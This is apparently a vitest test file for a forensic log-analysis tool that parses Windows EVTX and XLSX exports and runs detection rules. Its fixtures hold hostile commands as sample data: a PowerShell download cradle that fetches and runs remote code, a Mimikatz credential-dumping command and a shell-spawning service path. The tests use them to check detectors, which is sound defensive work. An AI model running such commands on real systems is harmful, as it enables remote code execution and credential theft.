import { strToU8, zipSync } from "fflate";
import { describe, expect, it } from "vitest";

import { isEvtx, parseEvtx } from "@/lib/investigations/evtx";
import { readXlsx } from "@/lib/investigations/xlsx";
import { fromWindowsEvent, parseEvtxEvents, type UesEvent } from "@/lib/investigations/normalize";
import { runForensicRules } from "@/lib/investigations/heuristics";
import { expandIntake } from "@/lib/investigations/service";
import { buildEvtx, type TestRecord } from "@/lib/__tests__/fixtures/evtx-builder";

const T0 = new Date("2026-10-20T08:00:00.123Z");
const at = (s: number) => new Date(T0.getTime() + s * 1000);
const SECURITY = "Microsoft-Windows-Security-Auditing";

const RECORDS: TestRecord[] = [
  { provider: SECURITY, eventId: 4625, time: at(0), computer: "DC-01.corp.test", userSid: "S-1-5-21-1-2-3-1001", data: { TargetUserName: "alice", IpAddress: "198.51.100.7", LogonType: "3" } },
  { provider: SECURITY, eventId: 4688, time: at(1), computer: "WS-02.corp.test", data: { TargetUserName: "-", NewProcessId: "0x1a4", CommandLine: "powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/a')\"" } },
  { provider: SECURITY, eventId: 4624, time: at(2), computer: "DC-01.corp.test", data: {} },
  { provider: SECURITY, eventId: 1102, time: at(3), computer: "DC-01.corp.test", data: { TargetUserName: "mallory" } },
];

describe("EVTX reader", () => {
  const bytes = buildEvtx(RECORDS, { corruptRecord: 3 });

  it("recognizes event log files", () => {
    expect(isEvtx(bytes)).toBe(true);
    expect(isEvtx(strToU8("not an event log"))).toBe(false);
  });

  it("expands templates and typed substitutions", () => {
    const { events } = parseEvtx(bytes);
    expect(events[0]).toMatchObject({
      recordId: 1,
      provider: SECURITY,
      eventId: 4625,
      computer: "DC-01.corp.test",
      userSid: "S-1-5-21-1-2-3-1001",
      data: { TargetUserName: "alice", IpAddress: "198.51.100.7", LogonType: "3" },
    });
    expect(events[0].timeCreated?.toISOString()).toBe("2026-10-20T08:00:00.123Z");
    // Second record reuses the first record's template and element names.
    expect(events[1]).toMatchObject({ eventId: 4688, computer: "WS-02.corp.test", data: { NewProcessId: "0x00000000000001a4" } });
    expect(events[1].userSid).toBeUndefined(); // optional substitution left empty
  });

  it("skips a damaged record, reports it, and keeps reading", () => {
    const { events, errors } = parseEvtx(bytes);
    expect(events.map((e) => e.recordId)).toEqual([1, 2, 4]);
    expect(errors).toHaveLength(1);
    expect(errors[0]).toMatch(/^record 3:/);
  });

  it("stops at the event cap", () => {
    expect(parseEvtx(bytes, { maxEvents: 2 })).toMatchObject({ truncated: true, events: [{ recordId: 1 }, { recordId: 2 }] });
  });
});

describe("Windows event mapping", () => {
  const events = parseEvtxEvents(parseEvtx(buildEvtx(RECORDS)).events).events;

  it("maps Security events onto UES types the rules understand", () => {
    expect(events[0]).toMatchObject({ platform: "windows_security", eventType: "auth_failure", userName: "alice", hostIp: "198.51.100.7", hostName: "DC-01.corp.test" });
    expect(events[1]).toMatchObject({ eventType: "process_create", processPid: 420 });
    expect(events[3]).toMatchObject({ eventType: "log_cleared" });
  });

  it("runs the forensic rules over them", () => {
    const rules = runForensicRules(events).map((f) => f.ruleId);
    expect(rules).toEqual(expect.arrayContaining(["download_cradle", "log_clearing"]));
  });

  it("treats PowerShell script blocks like command lines", () => {
    const block = fromWindowsEvent({ provider: "Microsoft-Windows-PowerShell", eventId: 4104, data: { ScriptBlockText: "sekurlsa::logonpasswords" }, time: at(0), computer: "WS-02" });
    expect(block).toMatchObject({ eventType: "script_block", processName: "powershell.exe" });
    expect(runForensicRules([block]).map((f) => f.ruleId)).toContain("credential_dumping");
  });

  it("flags services that run shells, but not Defender's own drivers", () => {
    const service = (path: string) => fromWindowsEvent({ provider: "Service Control Manager", eventId: 7045, data: { ServiceName: "x", ImagePath: path }, time: at(0), computer: "SRV-01" });
    expect(runForensicRules([service("%COMSPEC% /c echo payload > \\\\.\\pipe\\x")]).map((f) => f.ruleId)).toContain("service_persistence");
    expect(runForensicRules([service("C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{GUID}\\MpKsl.sys")])).toEqual([]);
    expect(runForensicRules([service("C:\\Program Files\\Vendor\\agent.exe")])).toEqual([]);
  });

  it("reports the member, not the group, for privileged group changes", () => {
    const add = fromWindowsEvent({ provider: SECURITY, eventId: 4732, data: { MemberName: "-", MemberSid: "S-1-5-21-9-1001", TargetUserName: "Administrators", SubjectUserName: "mallory" }, time: at(0), computer: "DC-01" });
    expect(add.userName).toBe("S-1-5-21-9-1001");
    expect(runForensicRules([add])[0]).toMatchObject({ ruleId: "privileged_group_add", techniques: ["T1098"] });
  });
});

describe("credential attack rules", () => {
  const fail = (user: string, ip: string, s: number): UesEvent => ({ timestamp: at(s), platform: "windows_security", eventType: "auth_failure", userName: user, hostIp: ip, raw: {} });
  const ok = (user: string, ip: string, s: number): UesEvent => ({ timestamp: at(s), platform: "windows_security", eventType: "auth", userName: user, hostIp: ip, raw: { LogonType: "3" } });

  it("flags password guessing, and a following success as critical", () => {
    const guesses = Array.from({ length: 12 }, (_, i) => fail("alice", "198.51.100.7", i * 20));
    expect(runForensicRules(guesses)).toEqual([expect.objectContaining({ ruleId: "brute_force", severity: "HIGH" })]);
    const found = runForensicRules([...guesses, ok("alice", "198.51.100.7", 300)]).find((f) => f.ruleId === "brute_force");
    expect(found).toMatchObject({ severity: "CRITICAL", techniques: ["T1110.001"] });
  });

  it("flags spraying across accounts from one source", () => {
    const spray = ["a", "b", "c", "d", "e", "f"].map((u, i) => fail(u, "198.51.100.8", i * 30));
    expect(runForensicRules(spray)).toEqual([expect.objectContaining({ ruleId: "password_spraying", techniques: ["T1110.003"] })]);
  });

  it("ignores scattered failures", () => {
    const scattered = Array.from({ length: 12 }, (_, i) => fail("alice", "198.51.100.7", i * 3600));
    expect(runForensicRules(scattered)).toEqual([]);
  });
});

// A minimal workbook the way Excel lays it out: shared strings, a date
// number format, an inline string, a boolean and a sparse row.
function workbook(sheets: Array<{ name: string; xml: string }>) {
  const files: Record<string, Uint8Array> = {
    "[Content_Types].xml": strToU8('<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>'),
    "xl/workbook.xml": strToU8(`<workbook xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets>${sheets.map((s, i) => `<sheet name="${s.name}" sheetId="${i + 1}" r:id="rId${i + 1}"/>`).join("")}</sheets></workbook>`),
    "xl/_rels/workbook.xml.rels": strToU8(`<Relationships>${sheets.map((_, i) => `<Relationship Id="rId${i + 1}" Target="worksheets/sheet${i + 1}.xml"/>`).join("")}</Relationships>`),
    "xl/sharedStrings.xml": strToU8('<sst><si><t>_time</t></si><si><t>host</t></si><si><t>CommandLine</t></si><si><r><t>WS-</t></r><r><t>01</t></r></si><si><t>cmd /c whoami &amp; net user</t></si></sst>'),
    "xl/styles.xml": strToU8('<styleSheet><numFmts><numFmt numFmtId="164" formatCode="yyyy\\-mm\\-dd hh:mm:ss"/></numFmts><cellXfs><xf numFmtId="0"/><xf numFmtId="164"/></cellXfs></styleSheet>'),
  };
  sheets.forEach((s, i) => (files[`xl/worksheets/sheet${i + 1}.xml`] = strToU8(s.xml)));
  return zipSync(files);
}

const EVENTS_SHEET = `<worksheet><sheetData>
<row r="1"><c r="A1" t="s"><v>0</v></c><c r="B1" t="s"><v>1</v></c><c r="C1" t="s"><v>2</v></c><c r="D1" t="inlineStr"><is><t>Blocked</t></is></c></row>
<row r="2"><c r="A2" s="1"><v>46315.3343</v></c><c r="B2" t="s"><v>3</v></c><c r="C2" t="s"><v>4</v></c><c r="D2" t="b"><v>1</v></c></row>
<row r="4"><c r="B4" t="s"><v>3</v></c><c r="D4" t="b"><v>0</v></c></row>
</sheetData></worksheet>`;

describe("XLSX reader", () => {
  it("reads rows keyed by the header, with dates as ISO times", () => {
    const [sheet] = readXlsx(workbook([{ name: "Export", xml: EVENTS_SHEET }]));
    expect(sheet.name).toBe("Export");
    expect(sheet.rows).toEqual([
      { _time: "2026-10-20T08:01:23.520Z", host: "WS-01", CommandLine: "cmd /c whoami & net user", Blocked: "TRUE" },
      { host: "WS-01", Blocked: "FALSE" },
    ]);
  });

  it("investigates sheets with a time column and reports the rest", () => {
    const notes = '<worksheet><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>note</t></is></c></row><row r="2"><c r="A2" t="inlineStr"><is><t>context</t></is></c></row></sheetData></worksheet>';
    const bytes = workbook([{ name: "Export", xml: EVENTS_SHEET }, { name: "Notes", xml: notes }]);
    const { parsed, skipped, texts } = expandIntake([{ name: "search.xlsx", bytes }]);
    expect(texts).toEqual([]);
    expect(parsed).toHaveLength(1);
    expect(parsed[0].name).toBe("search.xlsx › Export");
    expect(parsed[0].events[0]).toMatchObject({ hostName: "WS-01", commandLine: "cmd /c whoami & net user" });
    expect(skipped).toEqual(["search.xlsx › Notes (no time column)"]);
  });
});

describe("intake routing", () => {
  it("parses event logs and workbooks inside a ZIP, and reports unknown binaries", () => {
    const bundle = zipSync({
      "logs/Security.evtx": buildEvtx(RECORDS),
      "exports/search.xlsx": workbook([{ name: "Export", xml: EVENTS_SHEET }]),
      "notes.txt": strToU8("analyst notes"),
      "blob.bin": new Uint8Array(512),
    });
    const { parsed, texts, skipped } = expandIntake([{ name: "case.zip", bytes: bundle }]);
    expect(parsed.map((p) => [p.name, p.platform, p.events.length])).toEqual([
      ["case.zip/logs/Security.evtx", "windows_security", 4],
      ["case.zip/exports/search.xlsx › Export", expect.any(String), 2],
    ]);
    expect(texts.map((t) => t.name)).toEqual(["case.zip/notes.txt"]);
    expect(skipped).toEqual(["case.zip/blob.bin (unsupported binary format)"]);
  });
});
